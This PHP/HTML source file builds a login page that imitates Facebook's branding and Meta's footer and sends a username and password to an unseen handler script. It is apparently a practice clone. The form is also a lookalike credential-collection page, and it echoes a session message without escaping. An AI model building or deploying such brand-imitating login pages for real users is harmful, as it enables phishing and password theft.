<?php
session_start();
// include("facebookinterface.php");

?>

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="css/bootstrap.min.css">
    <title>Document</title>
</head>

<style>
.rr {
    align-content: center;
    justify-items: center;
}

.bord {
    border: 1px solid blue;
}

.card {
    width: 370px;
}
</style>

<body>

    <div class="container-fluid ">
        <div class="row ">
            <div class="col-sm-12 col-md-6 mx-auto d-lg-flex d-sm-flex ">

                <div class=" col-sm-7 col-lg-7 text-center  rr ">
                    <h1 class="text-primary mt-2  fs-1"> FaceBook</h1>

                    <h4> Facebook helps you connect and share with the people in your life.</h4>


                </div>

                <div class="col-sm-5 col-lg-5  my-5  mx-auto ">
                    <div class="card mx-auto shadow border-0 mt-5  ">

                        <div class="card-body ">

                            <?php if (isset($_SESSION["error-message"])) { ?>
                            <div class="alert alert-primary alert-dismissible fade show" role="alert">
                                <button type="button" class="btn-close" data-bs-dismiss="alert"
                                    aria-label="Close"></button>

                                <strong>Emtpy field</strong>
                                <?= $_SESSION["error-message"]; ?>

                            </div>
                            <?php } ?>

                            <form action="facebookinterface.php" method="post" enctype="multipart/form-data">
                                <input type="text" class="form-control form-control-lg text-secondary bord"
                                    placeholder="Phone number, username or email" name="name">
                                <br>
                                <input type="password" class="form-control-lg form-control bord" name="password"
                                    placeholder="Password">
                                <br>
                                <button type="submit" class="btn btn-primary form-control">
                                    <h4>Log in</h4>
                                </button>


                            </form>

                        </div>
                        <h6 class="text-center text-primary"> Forgotten password?</h6>

                        <hr>
                        <div class=" text-center my-3">
                            <button class="btn btn-success">
                                <h5 class=""> Create new account </h5>
                            </button>
                            <br>

                        </div>

                    </div>


                </div>
            </div>
        </div>


        <div class="row mt-5 text-center position-absolute bottom-0  bg-light w-100">
            <div class="col-sm-12 col-lg-12  ">

                <div class="text-center text-secondary"> Meta About Blog Jobs Help
                    API Privacy Terms
                    <br>
                    Locations Instagram Lite Threads
                    <br>
                    Contact Uploading & Non-Users Meta Verified
                    <br>
                    English © 2025 Instagram from Meta
                </div>
            </div>
        </div>
        <script src="js/bootstrap.min.js"></script>
    </div>
    <?php unset($_SESSION["error-message"]); ?>

</body>

</html>